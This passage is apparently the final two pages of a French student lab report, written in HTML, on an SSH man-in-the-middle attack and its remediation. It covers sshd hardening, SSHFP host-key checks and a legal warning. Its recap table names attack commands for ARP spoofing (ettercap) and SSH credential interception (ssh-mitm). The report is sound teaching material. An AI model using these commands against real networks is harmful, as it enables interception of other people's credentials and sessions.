+    <div class="cmd-list">
+      <div class="cmd-item">
+        <div class="cmd-item-code teal">PasswordAuthentication no</div>
+        <div class="cmd-item-desc"><strong>Pourquoi ?</strong> Supprime l'envoi de mots de passe — seule l'authentification par clé est acceptée. Rend l'attaque ssh-mitm inutile : rien à capturer.</div>
+      </div>
+      <div class="cmd-item">
+        <div class="cmd-item-code teal">PermitRootLogin no</div>
+        <div class="cmd-item-desc"><strong>Pourquoi ?</strong> Interdit la connexion SSH directe en root — réduit la surface d'attaque. L'attaquant ne peut pas obtenir un accès root immédiat même avec des identifiants volés.</div>
+      </div>
+      <div class="cmd-item">
+        <div class="cmd-item-code teal">MaxAuthTries 3</div>
+        <div class="cmd-item-desc"><strong>Pourquoi ?</strong> Limite les tentatives d'authentification — protège contre les attaques par force brute. Après 3 échecs, la connexion est coupée.</div>
+      </div>
+      <div class="cmd-item">
+        <div class="cmd-item-code teal">KexAlgorithms / Ciphers / MACs</div>
+        <div class="cmd-item-desc"><strong>Pourquoi ?</strong> Force l'utilisation des algorithmes cryptographiques recommandés par l'ANSSI — désactive les algorithmes obsolètes ou vulnérables (ex : DES, RC4, MD5).</div>
+      </div>
+    </div>
+
+  </div>
+  <div class="pg-footer">Compte rendu TP MITM SSH — BTS SIO 2e année — Aouizir Chahine — Page 4 / 5</div>
+</div>
+
+<!-- ════════ PAGE 5 — SSHFP + CONCLUSION ════════ -->
+<div class="page">
+  <div class="pg-header">
+    <div class="pg-header-left">TP MITM SSH — ATTAQUE MAN-IN-THE-MIDDLE SUR SSH</div>
+    <div class="pg-header-right">Bloc 3 — Cybersécurité — BTS SIO 2e année — Aouizir Chahine</div>
+  </div>
+  <div class="pg-header-accent"></div>
+  <div class="pg-body">
+
+    <!-- Section 9 — SSHFP -->
+    <div class="sec"><div class="sec-num teal">9</div><div class="sec-title">Vérification de l'identité — Mécanisme SSHFP</div><div class="sec-line teal"></div></div>
+
+    <div class="theory teal">
+      <div class="theory-title">Qu'est-ce que SSHFP et pourquoi remplace-t-il le TOFU ?</div>
+      <p>SSHFP (SSH Fingerprint) publie l'empreinte de la clé du serveur SSH dans un <strong>enregistrement DNS signé (DNSSEC)</strong>.</p>
+      <p>Lors de la connexion, le client vérifie automatiquement l'empreinte du serveur en interrogeant le DNS — sans intervention de l'utilisateur.</p>
+      <p><strong>Avantage vs TOFU :</strong> l'utilisateur n'a plus à accepter manuellement → moins de risque d'accepter une fausse clé MITM.</p>
+    </div>
+
+    <div>
+      <div class="fig-label teal">Figure 7 — Génération et publication des enregistrements SSHFP</div>
+      <div class="code-wrap">
+        <div class="code-badge">Serveur — SSHFP via DNS</div>
+        <pre><span class="cmt"># Sur le serveur : générer les enregistrements SSHFP à publier dans le DNS</span>
+<span class="tx">server# </span><span class="kw">ssh-keygen -r nom-du-serveur</span>
+
+<span class="cmt"># Résultat : enregistrements à ajouter dans la zone DNS</span>
+<span class="val">nom-du-serveur IN SSHFP 4 2 a1b2c3d4e5f6... (ED25519 + SHA-256)</span>
+<span class="val">nom-du-serveur IN SSHFP 1 2 f6e5d4c3b2a1... (RSA + SHA-256)</span>
+
+<span class="cmt"># Sur le client : connexion avec vérification SSHFP automatique</span>
+<span class="tx">client$ </span><span class="kw">ssh -o VerifyHostKeyDNS=yes admin@nom-du-serveur</span>
+
+<span class="cmt"># Résultat si l'empreinte correspond :</span>
+<span class="ok">Matching host key fingerprint found in DNS.</span>
+<span class="ok">admin@serveur:~$    # Connexion établie — identité vérifiée via DNS</span>
+
+<span class="cmt"># Résultat si l'empreinte NE correspond PAS (MITM détecté) :</span>
+<span class="err">WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!</span>
+<span class="err">Connection refused — possible MITM attack detected!</span></pre>
+      </div>
+    </div>
+
+    <div class="expl teal">
+      <div class="expl-row"><div class="expl-label cmd teal">⌨ Commande(s) utilisée(s)</div><div class="expl-cmd">ssh-keygen -r &lt;serveur&gt;  /  ssh -o VerifyHostKeyDNS=yes</div></div>
+      <div class="expl-row"><div class="expl-label why">🧠 Pourquoi SSHFP améliore-t-il la sécurité ?</div><div class="expl-text">Avec TOFU, l'utilisateur peut par erreur accepter la clé d'un attaquant MITM. Avec SSHFP, la vérification est automatique via le DNS — si la clé ne correspond pas, la connexion est refusée sans intervention humaine. Particulièrement utile en environnement professionnel avec de nombreux serveurs.</div></div>
+      <div class="expl-row"><div class="expl-label res">✅ Résultat attendu</div><div class="expl-text">L'empreinte est vérifiée automatiquement → une attaque MITM est détectée et bloquée avant même l'authentification.</div></div>
+    </div>
+
+    <!-- Tableau récap global -->
+    <div class="sec"><div class="sec-num">10</div><div class="sec-title">Récapitulatif — Attaque vs Contre-mesures</div><div class="sec-line"></div></div>
+
+    <table>
+      <thead>
+        <tr><th>#</th><th>Étape</th><th>Outil / Commande</th><th>Phase</th><th>Ce que ça prouve</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>1</td><td>Reconnaissance</td><td>nmap -sV -p 22</td><td class="attack">⚔️ Attaque</td><td>Identifier les services vulnérables</td></tr>
+        <tr><td>2</td><td>ARP Spoofing</td><td>ettercap -M arp:remote</td><td class="attack">⚔️ Attaque</td><td>Se positionner en MITM sur le réseau</td></tr>
+        <tr><td>3</td><td>Interception SSH</td><td>ssh-mitm --listen-port 10022</td><td class="attack">⚔️ Attaque</td><td>Capturer identifiants + commandes</td></tr>
+        <tr><td>4</td><td>Clés SSH ed25519</td><td>ssh-keygen -t ed25519</td><td class="defense">🛡️ Défense</td><td>Plus de mot de passe à intercepter</td></tr>
+        <tr><td>5</td><td>Durcissement sshd</td><td>PasswordAuthentication no</td><td class="defense">🛡️ Défense</td><td>Supprimer les vecteurs d'attaque</td></tr>
+        <tr><td>6</td><td>Algos ANSSI</td><td>KexAlgorithms / Ciphers / MACs</td><td class="defense">🛡️ Défense</td><td>Désactiver les algorithmes obsolètes</td></tr>
+        <tr><td>7</td><td>SSHFP via DNS</td><td>ssh-keygen -r / VerifyHostKeyDNS</td><td class="defense">🛡️ Défense</td><td>Vérifier l'identité sans TOFU</td></tr>
+      </tbody>
+    </table>
+
+    <div class="result-box">
+      <div class="r-title">✅ Bilan du TP — Attaque → Remédiation</div>
+      <p>Ce TP a démontré qu'un protocole chiffré comme SSH peut être compromis si l'identité du serveur n'est pas vérifiée.<br>
+      L'approche offensive (ARP Spoofing + ssh-mitm) montre concrètement l'impact d'une attaque MITM.<br>
+      La remédiation (clés ed25519 + sshd_config durci + SSHFP) coupe tous les vecteurs d'attaque identifiés.</p>
+    </div>
+
+    <div class="warn">
+      <div class="warn-title">⚠️ Cadre légal — Ce TP a été réalisé en environnement virtualisé isolé</div>
+      <p>Toutes ces attaques ont été réalisées sur une maquette pédagogique VirtualBox, dans un réseau fermé.</p>
+      <p>Reproduire ces techniques sur un réseau réel sans autorisation est <strong>illégal</strong> (article 323-1 du Code pénal).</p>
+    </div>
+
+  </div>
+  <div class="pg-footer">Compte rendu TP MITM SSH — BTS SIO 2e année — Aouizir Chahine — Page 5 / 5</div>
+</div>
+
+</body>
+</html>
